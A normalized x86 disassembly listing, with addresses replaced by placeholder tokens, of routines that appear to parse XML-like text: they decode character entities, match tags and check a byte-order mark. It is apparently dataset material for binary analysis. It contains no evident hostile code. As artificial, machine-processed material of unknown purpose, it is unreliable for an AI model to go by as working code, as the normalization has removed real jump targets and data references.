lea ecx [ ebp + 0x2 ]
test al al
je r-xdata
mov edx [ esi + 0x4 ]
mov eax [ esi ]
push edx
push ebp
push eax
call sub_4425e4
add esp 0xc
test eax eax
je r-xdata
mov dl [ ebp ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
mov [ eax ] dl
pop ebp
mov eax ebx
pop ebx
retn
xor ebx ebx
lea esi [ ebx + 0x1 ]
cmp al 0x78
jne r-xdata
push 0x3b
push ecx
call sub_441150
add esp 0x8
test eax eax
je r-xdata
cmp [ ebp + 0x3 ] bl
lea eax [ ebp + 0x3 ]
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
cmp [ eax ] bl
je r-xdata
push 0x3b
push eax
call sub_441150
add esp 0x8
test eax eax
je r-xdata
mov cl [ eax - 0x1 ]
mov edi eax
dec eax
sub edi ebp
cmp cl 0x23
je r-xdata
cmp [ eax ] bl
je r-xdata
cmp [ esp + 0x20 ] 0x1
jne r-xdata
cmp cl 0x30
jl r-xdata
mov cl [ eax - 0x1 ]
mov edi eax
dec eax
sub edi ebp
cmp cl 0x78
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov [ eax ] bl
lea eax [ edi + ebp + 0x1 ]
pop edi
pop esi
pop ebp
mov [ ecx ] 0x1
pop ebx
retn
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov eax ebx
call sub_42be90
lea eax [ edi + ebp + 0x1 ]
pop edi
pop esi
pop ebp
pop ebx
retn
cmp cl 0x39
jg r-xdata
cmp cl 0x30
jl r-xdata
movsx edx cl
mov cl [ eax - 0x1 ]
sub edx 0x30
imul edx esi
dec eax
lea esi [ esi + esi * 4 ]
add ebx edx
add esi esi
cmp cl 0x23
jne r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x39
jg r-xdata
cmp cl 0x41
jl r-xdata
cmp cl 0x66
jg r-xdata
movsx ecx cl
sub ecx 0x30
jmp r-xdata
cmp cl 0x46
jg r-xdata
movsx edx cl
sub edx 0x57
imul edx esi
add ebx edx
jmp r-xdata
imul ecx esi
add ebx ecx
movsx ecx cl
sub ecx 0x37
mov cl [ eax - 0x1 ]
dec eax
shl esi 0x4
cmp cl 0x78
jne r-xdata
jmp r-xdata
sub_42c470
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi ecx
push edi
mov edi eax
test esi esi
je r-xdata
pop edi
pop esi
xor al al
pop ebp
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ esp + 0x10 ] 0x0
push ebx
je r-xdata
mov al [ edi ]
test al al
je r-xdata
lea esp [ esp ]
pop ebx
pop edi
pop esi
mov al 0x1
pop ebp
retn
cmp [ esi ] al
jne r-xdata
movsx eax [ esi ]
cmp ebp 0x1
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
inc esi
inc edi
cmp [ esi ] 0x0
jne r-xdata
push eax
call sub_4429c3
add esp 0x4
cmp eax 0x80
jge r-xdata
pop ebx
pop edi
pop esi
xor al al
pop ebp
retn
jmp r-xdata
push eax
call sub_4429c3
add esp 0x4
cmp eax 0x80
jge r-xdata
mov ebx eax
movsx eax [ edi ]
cmp ebp 0x1
jne r-xdata
inc esi
inc edi
cmp [ esi ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
sub_42c500
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x1c ]
xor esi esi
mov ebx r--data
call sub_42a390
cmp [ esp + 0x20 ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov esi [ esp + 0x28 ]
push esi
mov eax ebp
mov [ esp + 0x24 ] 0x0
call sub_42c180
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
mov eax ebp
cmp [ ebp ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp [ ebp ] 0x0
je r-xdata
mov esi [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
push esi
push 0x0
mov ecx ebp
call sub_42c470
add esp 0x8
test al al
jne r-xdata
mov eax [ esp + 0x24 ]
push esi
push 0x0
mov ecx ebp
call sub_42c470
add esp 0x8
test al al
jne r-xdata
cmp [ ebp ] 0x0
je r-xdata
lea ecx [ esp + 0x18 ]
mov [ esp + 0x20 ] al
mov [ esp + 0x21 ] al
mov [ esp + 0x22 ] al
mov [ esp + 0x23 ] al
push ecx
mov eax esi
lea ecx [ esp + 0x24 ]
mov edi ebp
call sub_42be10
mov ebx [ esp + 0x20 ]
mov ebp eax
mov eax [ ebx ]
mov esi [ eax ]
add esi [ esp + 0x1c ]
add esp 0x4
cmp esi [ eax + 0x4 ]
jbe r-xdata
mov bl [ ebp ]
cmp bl 0xd
je r-xdata
mov eax [ esp + 0x24 ]
lea edx [ eax + 0x1 ]
mov eax [ ebx ]
mov edx [ esp + 0x18 ]
push edx
mov edx [ eax ]
lea ecx [ esp + 0x24 ]
push ecx
lea eax [ edx + eax + 0x8 ]
push eax
call sub_441f70
mov ecx [ ebx ]
mov [ ecx ] esi
mov edx [ ebx ]
add esp 0xc
mov [ edx + esi + 0x8 ] 0x0
test ebp ebp
jne r-xdata
mov edi [ eax + 0x4 ]
add edi esi
push ebx
call sub_42a2d0
inc ebp
mov [ esp + 0x20 ] 0x1
cmp bl 0xa
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add ebp eax
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
pop ecx
retn
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
pop ecx
retn
movzx eax bl
push eax
call sub_4427fa
add esp 0x4
test eax eax
jne r-xdata
cmp bl 0xa
je r-xdata
cmp bl 0xd
je r-xdata
mov ebx [ esp + 0x1c ]
cmp [ esp + 0x20 ] al
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
mov eax esi
lea ecx [ esp + 0x1c ]
mov edi ebp
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x1d ] 0x0
mov [ esp + 0x1e ] 0x0
mov [ esp + 0x1f ] 0x0
call sub_42be10
mov ebp eax
mov eax [ esp + 0x14 ]
add esp 0x4
cmp eax 0x1
jne r-xdata
push 0x20
call sub_42a5c0
mov [ esp + 0x20 ] 0x0
push eax
lea eax [ esp + 0x1c ]
push eax
call sub_42a470
jmp r-xdata
mov edx [ esp + 0x18 ]
push edx
call sub_42a5c0
jmp r-xdata
test ebp ebp
jne r-xdata
sub_42c6e0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
push ebx
push esi
push edi
xor eax eax
lea edi [ ecx + 0x34 ]
xor esi esi
mov ebx r--data
mov [ esp + 0xc ] ecx
mov [ ecx + 0x2c ] al
mov [ ecx + 0x30 ] eax
mov [ esp + 0x10 ] edi
call sub_42a390
mov esi [ esp + 0xc ]
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x3c ] edi
cmp eax edi
je r-xdata
cmp [ esi + 0x2c ] 0x0
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x30 ] 0xc
mov ebx [ rw-data ]
mov eax ebx
lea edx [ eax + 0x1 ]
or ecx 0xffffffff
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx edi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ esp + 0x10 ]
sub eax edx
mov esi eax
call sub_42a390
mov eax [ esp + 0xc ]
or ecx 0xffffffff
mov [ eax + 0x40 ] ecx
mov [ eax + 0x3c ] ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov edx [ ecx ]
mov [ esi + 0x4 ] edx
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
jmp r-xdata
push ebx
call sub_42c180
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
mov edx [ esi + 0x38 ]
mov ecx [ esi + 0x4 ]
mov ebx [ ebp + 0x10 ]
mov [ esp + 0x24 ] edx
mov edx [ esi + 0x8 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] edx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] edx
cmp ebx edi
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ esi + 0x2c ] al
jne r-xdata
cmp cl 0xef
jne r-xdata
cmp [ esi + 0x18 ] 0x0
jne r-xdata
push edi
push esi
mov esi ebx
call sub_42c9f0
mov esi eax
test esi esi
je r-xdata
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x30 ] 0xc
mov ebx [ rw-data ]
mov eax ebx
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax + 0x1 ]
test cl cl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ esi + 0x2c ] 0x0
jne r-xdata
mov esi [ esp + 0xc ]
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push ebx
lea ecx [ esp + 0x1c ]
push ecx
push edi
mov ecx esi
call edx
mov ecx [ esp + 0xc ]
mov [ ebp + 0x8 ] eax
mov eax esi
call sub_42acf0
test ebx ebx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
cmp cl 0xbb
jne r-xdata
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x30 ] 0xc
mov ebx [ rw-data ]
mov eax ebx
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ ebp + 0x8 ]
push ebx
call sub_42c180
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x34 ]
mov ecx esi
call edx
test eax eax
je r-xdata
mov cl [ eax + 0x2 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
mov esi [ esp + 0xc ]
mov eax [ esi ]
mov edx [ eax + 0x34 ]
mov ecx esi
call edx
mov ebx [ eax + 0x30 ]
add ebx 0x8
cmp [ ebx ] 0x0
mov [ esp + 0x14 ] ebx
jne r-xdata
cmp cl 0xbf
jne r-xdata
mov esi r--data
sub ebx esi
mov ebx 0x1
jmp r-xdata
mov ebx 0x1
mov [ esi + 0x44 ] bl
mov ebx 0x1
jmp r-xdata
movsx eax [ ebx + esi ]
push eax
call sub_4429c3
mov edi eax
movsx eax [ esi ]
push eax
call sub_4429c3
add esp 0x8
cmp edi eax
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
inc esi
cmp [ ebx + esi ] 0x0
jne r-xdata
mov ebx [ esp + 0x14 ]
cmp [ ebx ] 0x0
mov esi r--data
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov ebx 0x2
sub ebx esi
mov ebx 0x1
jmp r-xdata
movsx eax [ ebx + esi ]
push eax
call sub_4429c3
mov edi eax
movsx eax [ esi ]
push eax
call sub_4429c3
add esp 0x8
cmp edi eax
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
inc esi
cmp [ ebx + esi ] 0x0
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
sub_42c980
push ebp
mov ebp [ esp + 0x8 ]
cmp [ ebp + 0x2c ] 0x0
jne r-xdata
pop ebp
retn 0x10
push ebx
mov [ ebp + 0x30 ] eax
mov [ ebp + 0x2c ] 0x1
mov ebx [ eax * 4 + rw-data ]
push esi
mov eax ebx
push edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea edi [ ebp + 0x34 ]
mov esi eax
call sub_42a390
or eax 0xffffffff
mov [ ebp + 0x40 ] eax
mov [ ebp + 0x3c ] eax
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov edi [ esp + 0x1c ]
test edi edi
je r-xdata
mov ecx [ esp + 0x20 ]
push ecx
push eax
call sub_42bf90
mov edx [ edi ]
mov [ ebp + 0x3c ] edx
mov eax [ edi + 0x4 ]
mov [ ebp + 0x40 ] eax
sub_42c9f0
push 0xffffffff
push sub_4597f6
mov eax [ fs : 0x0 ]
push eax
push ebx
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x20 ]
push esi
call sub_42c180
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov cl [ eax ]
test cl cl
je r-xdata
cmp cl 0x3c
jne r-xdata
push esi
call sub_42c180
mov edi eax
add esp 0x4
test edi edi
je r-xdata
cmp [ edi ] 0x0
je r-xdata
push esi
push 0x1
mov eax r--data
mov ecx edi
call sub_42c470
add esp 0x8
test al al
je r-xdata
mov bl [ edi ]
mov eax r--data
test bl bl
je r-xdata
push 0x38
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
mov eax r--data
test bl bl
je r-xdata
mov edx edi
sub edx eax
xor eax eax
call sub_42a830
jmp r-xdata
mov eax r--data
test bl bl
je r-xdata
mov edx edi
sub edx eax
push 0x2c
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
cmp [ edx + eax ] cl
jne r-xdata
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
add esp 0xc
retn 0x8
mov ecx [ esp + 0x1c ]
mov [ eax + 0x10 ] ecx
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
add esp 0xc
retn 0x8
test eax eax
je r-xdata
mov al [ edi + 0x1 ]
call sub_42bf70
test eax eax
jne r-xdata
mov edx edi
sub edx eax
lea esp [ esp ]
push 0x30
call sub_43fa1d
add esp 0x4
mov [ esp + 0x20 ] eax
mov [ esp + 0x14 ] 0x0
test eax eax
je r-xdata
cmp [ edx + eax ] cl
jne r-xdata
call sub_42a6f0
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
inc eax
cmp [ edx + eax ] 0x0
jne r-xdata
push 0x50
call sub_43fa1d
add esp 0x4
mov [ esp + 0x20 ] eax
mov [ esp + 0x14 ] 0x1
test eax eax
je r-xdata
cmp [ edi + 0x1 ] 0x5f
jne r-xdata
push 0x2c
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
cmp [ edx + eax ] cl
jne r-xdata
xor eax eax
mov [ eax + 0x2c ] 0x1
jmp r-xdata
push eax
call sub_42a760
mov [ eax + 0x2c ] 0x1
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
inc eax
cmp [ edx + eax ] 0x0
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
push eax
mov ecx r--data
call sub_42add0
jmp r-xdata
call sub_42a8f0
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
inc eax
cmp [ edx + eax ] 0x0
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
sub_42cbd0
push 0xffffffff
push sub_459ad8
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
mov ebp ecx
mov [ esp + 0x1c ] ebp
mov edi [ esp + 0x38 ]
mov eax [ esp + 0x30 ]
push edi
call sub_42c180
add esp 0x4
mov ebx eax
mov esi ebp
test ebp ebp
je r-xdata
xor esi esi
mov [ esp + 0x14 ] esi
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
test eax eax
jne r-xdata
test esi esi
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov esi eax
mov [ esp + 0x14 ] eax
jmp r-xdata
mov esi [ esi + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
cmp [ esi + 0x2c ] 0x0
jne r-xdata
cmp [ esp + 0x34 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x30 ] 0x3
mov ebx [ rw-data ]
mov eax ebx
lea edx [ eax + 0x1 ]
cmp [ ebx ] 0x3c
je r-xdata
push edi
mov edi [ esp + 0x38 ]
push ebx
call sub_42bf90
mov eax edi
mov ecx [ eax ]
mov edi [ esp + 0x38 ]
mov [ ebp + 0x4 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x8 ] edx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebp [ esp + 0x14 ]
sub eax edx
lea edi [ ebp + 0x34 ]
mov esi eax
call sub_42a390
or eax 0xffffffff
mov [ ebp + 0x40 ] eax
mov [ ebp + 0x3c ] eax
push edi
lea eax [ ebx + 0x1 ]
call sub_42c180
mov [ esp + 0x1c ] eax
lea ebx [ ebp + 0x20 ]
push eax
mov eax ebx
call sub_42c230
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax [ esp + 0x34 ]
push edi
push eax
push ebx
push esi
mov eax 0x3
call sub_42c980
jmp r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x18 ]
push edi
push edx
push eax
push esi
mov eax 0x4
call sub_42c980
jmp r-xdata
lea esi [ esp + 0x30 ]
call sub_42a4c0
mov eax ebx
mov ebx esi
mov [ esp + 0x28 ] 0x0
call sub_42a280
mov eax [ esp + 0x30 ]
cmp eax rw-data
je r-xdata
mov edi [ esp + 0x38 ]
push edi
mov eax ebp
call sub_42c180
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov eax ebp
jmp r-xdata
push eax
call sub_43f960
add esp 0x4
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov al [ esi ]
test al al
je r-xdata
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn 0xc
mov eax [ esp + 0x30 ]
cmp eax rw-data
je r-xdata
mov ecx [ esp + 0x34 ]
push edi
push ecx
push ebp
push eax
mov eax 0x6
call sub_42c980
cmp al 0x2f
je r-xdata
push eax
call sub_43f960
add esp 0x4
jmp r-xdata
inc esi
cmp [ esi ] 0x3e
je r-xdata
cmp al 0x3e
je r-xdata
mov eax [ esp + 0x30 ]
inc esi
cmp eax rw-data
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ebx [ esp + 0x34 ]
mov eax [ esp + 0x1c ]
push edi
push ebx
inc esi
push esi
push eax
call sub_42d070
test eax eax
je r-xdata
push 0x24
call sub_43fa1d
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov eax esi
jmp r-xdata
push eax
call sub_43f960
add esp 0x4
mov eax [ esp + 0x30 ]
cmp eax rw-data
je r-xdata
mov edx [ esp + 0x34 ]
push edi
push edx
push esi
push eax
mov eax 0x7
call sub_42c980
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
or eax 0xffffffff
mov [ ebx + 0x8 ] eax
mov [ ebx + 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx ] r--data
mov ecx rw-data
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0x18 ] ecx
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x34 ]
mov edx [ ebx ]
mov edx [ edx + 0x8 ]
push edi
push eax
mov [ ebx + 0x10 ] ecx
push esi
mov ecx ebx
mov [ esp + 0x24 ] esi
call edx
mov ebp eax
test ebp ebp
je r-xdata
push eax
call sub_43f960
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x30 ]
cmp eax rw-data
je r-xdata
push edi
push ebx
push eax
push ecx
mov eax 0x8
call sub_42c980
mov ebp [ esp + 0x30 ]
lea ecx [ ebp + 0x8 ]
mov esi eax
sub esi ecx
nop
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
push eax
call sub_43f960
add esp 0x4
jmp r-xdata
mov ecx [ ebp ]
push edi
add eax ecx
call sub_42c180
add esp 0x4
test eax eax
je r-xdata
cmp [ esi + ecx ] dl
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
push 0x1
mov ecx ebx
call edx
mov eax [ esp + 0x30 ]
cmp eax rw-data
je r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x18 ]
push edi
push ecx
push edx
push eax
mov eax 0x3
call sub_42c980
mov edi [ esp + 0x1c ]
mov esi [ ebx + 0x14 ]
add edi 0x2c
add esi 0x8
call sub_42bce0
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
cmp [ ecx ] 0x0
jne r-xdata
inc ecx
cmp [ esi + ecx ] 0x0
jne r-xdata
push eax
call sub_43f960
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov [ ebx + 0x20 ] edi
mov eax [ edi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov ecx [ edi + 0x1c ]
mov [ ecx + 0x20 ] ebx
mov [ edi + 0x1c ] ebx
jmp r-xdata
cmp ebp rw-data
je r-xdata
push edi
push ebx
push eax
push ecx
mov eax 0x8
call sub_42c980
cmp cl 0x3e
jne r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov edx [ ebx ]
mov eax [ edx ]
push 0x1
mov ecx ebx
call eax
mov eax [ esp + 0x30 ]
cmp eax rw-data
je r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
push ecx
mov ecx [ esp + 0x1c ]
push edx
push ecx
push eax
mov eax 0x3
call sub_42c980
cmp [ ebp ] 0x0
je r-xdata
push ebp
call sub_43f960
add esp 0x4
jmp r-xdata
lea esi [ eax + 0x1 ]
cmp ebp rw-data
je r-xdata
cmp ebp rw-data
je r-xdata
push edi
push ebx
push eax
push ecx
mov eax 0x8
call sub_42c980
push eax
call sub_43f960
add esp 0x4
jmp r-xdata
push ebp
call sub_43f960
add esp 0x4
mov eax esi
jmp r-xdata
push ebp
call sub_43f960
add esp 0x4
jmp r-xdata
sub_42d070
push 0xffffffff
push sub_459aab
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
mov edi [ esp + 0x28 ]
mov esi edi
test edi edi
je r-xdata
mov [ esp + 0x14 ] 0x0
mov esi [ esp + 0x14 ]
nop
test esi esi
je r-xdata
nop
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov esi eax
mov [ esp + 0x14 ] esi
jmp r-xdata
mov esi [ esi + 0x10 ]
test esi esi
jne r-xdata
mov eax ebp
cmp [ esi + 0x2c ] 0x0
jne r-xdata
cmp al 0x3c
je r-xdata
mov ebx [ esp + 0x34 ]
mov eax [ esp + 0x2c ]
push ebx
call sub_42c180
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
test eax eax
jne r-xdata
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x30 ] 0x5
mov ebx [ rw-data ]
mov eax ebx
lea edx [ eax + 0x1 ]
mov eax r--data
mov ecx ebp
sub ecx eax
push 0x30
call sub_43fa1d
add esp 0x4
mov [ esp + 0x2c ] eax
xor edi edi
mov [ esp + 0x20 ] edi
cmp eax edi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea edi [ esi + 0x34 ]
mov esi eax
call sub_42a390
mov eax [ esp + 0x14 ]
or ecx 0xffffffff
mov [ eax + 0x40 ] ecx
mov [ eax + 0x3c ] ecx
cmp [ ecx + eax ] dl
jne r-xdata
mov [ esp + 0x20 ] 0xffffffff
test edi edi
je r-xdata
push eax
call sub_42a760
mov edi eax
cmp [ eax ] 0x0
je r-xdata
inc eax
cmp [ ecx + eax ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x30 ]
mov eax [ edi ]
mov edx [ eax + 0x8 ]
push ebx
push ecx
push ebp
mov ecx edi
call edx
mov ebp eax
mov eax [ edi + 0x20 ]
xor esi esi
cmp [ eax ] esi
jbe r-xdata
push ebp
push edi
mov esi ebx
call sub_42c9f0
mov edi eax
test edi edi
je r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0x10
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
jmp r-xdata
mov edi edi
mov eax [ esp + 0x30 ]
mov edx [ edi ]
mov edx [ edx + 0x8 ]
push ebx
push eax
push ebp
mov ecx edi
call edx
mov ecx [ esp + 0x28 ]
mov ebp eax
mov eax edi
call sub_42acf0
push ebx
mov eax ebp
call sub_42c180
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
mov eax [ edi + 0x20 ]
inc esi
cmp esi [ eax ]
jb r-xdata
cmp bl 0xa
je r-xdata
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x28 ]
jmp r-xdata
mov bl [ eax + esi + 0x8 ]
movzx eax bl
push eax
call sub_4427fa
add esp 0x4
test eax eax
jne r-xdata
mov ebx [ esp + 0x34 ]
cmp bl 0xd
jne r-xdata
mov al [ ebp ]
test al al
je r-xdata
mov ecx [ esp + 0x28 ]
mov eax edi
call sub_42acf0
mov ebx [ esp + 0x34 ]
jmp r-xdata
sub_42d270
push ecx
push ebx
push ebp
mov ebp ecx
push esi
push edi
mov esi ebp
test ebp ebp
je r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ ecx ]
test esi esi
je r-xdata
push ebx
push esi
call sub_42bf90
mov eax [ edi ]
mov [ ebp + 0x4 ] eax
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov [ esp + 0x10 ] eax
jmp r-xdata
mov esi [ esi + 0x10 ]
test esi esi
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov al [ esi ]
test al al
je r-xdata
mov ebx [ esp + 0x20 ]
mov eax [ esp + 0x18 ]
push ebx
call sub_42c180
mov edi [ esp + 0x20 ]
add esp 0x4
mov esi eax
test edi edi
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0xc
push ebx
push edi
push esi
push eax
mov eax 0x9
call sub_42c980
cmp al 0x3c
jne r-xdata
inc esi
add ebp 0x20
mov [ esp + 0x18 ] esi
xor esi esi
mov ebx r--data
mov edi ebp
call sub_42a390
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x3e
jne r-xdata
mov edx [ esp + 0x20 ]
push edx
push 0x0
push 0x0
push eax
mov eax 0x9
call sub_42c980
cmp al 0x3e
je r-xdata
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
pop ecx
retn 0xc
pop edi
pop esi
pop ebp
lea eax [ ebx + 0x1 ]
pop ebx
pop ecx
retn 0xc
mov [ esp + 0x18 ] al
mov eax [ ebp ]
mov esi [ eax ]
inc esi
cmp esi [ eax + 0x4 ]
jbe r-xdata
mov eax [ ebp ]
mov ecx [ eax ]
push 0x1
lea edx [ esp + 0x1c ]
push edx
lea edx [ ecx + eax + 0x8 ]
push edx
call sub_441f70
mov eax [ ebp ]
mov [ eax ] esi
mov ecx [ ebp ]
add esp 0xc
add ebx 0x1
mov [ ecx + esi + 0x8 ] 0x0
jne r-xdata
mov edi [ eax + 0x4 ]
add edi esi
push ebp
call sub_42a2d0
sub_42d3c0
sub esp 0xc
push ebx
push ebp
push esi
push edi
mov edi ecx
mov [ esp + 0x18 ] edi
mov esi edi
test edi edi
je r-xdata
mov [ esp + 0x10 ] 0x0
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
test eax eax
jne r-xdata
mov eax r--data
test ebp ebp
je r-xdata
push esi
push ebp
call sub_42bf90
mov ecx [ edi ]
mov eax [ esp + 0x18 ]
mov [ eax + 0x4 ] ecx
mov edx [ edi + 0x4 ]
mov [ eax + 0x8 ] edx
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov [ esp + 0x10 ] eax
jmp r-xdata
mov esi [ esi + 0x10 ]
test esi esi
jne r-xdata
mov eax [ esp + 0x10 ]
push esi
push edi
push ebp
push eax
mov eax 0xa
call sub_42c980
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn 0xc
cmp [ ebp ] 0x0
je r-xdata
add edi 0x20
xor esi esi
mov ebx r--data
mov [ esp + 0x14 ] edi
call sub_42a390
mov esi [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
push esi
call sub_42c180
mov edi [ esp + 0x28 ]
add esp 0x4
mov ebp eax
test edi edi
je r-xdata
mov edx ebp
sub edx eax
lea ebx [ ebx ]
mov eax r--data
lea edx [ eax + 0x1 ]
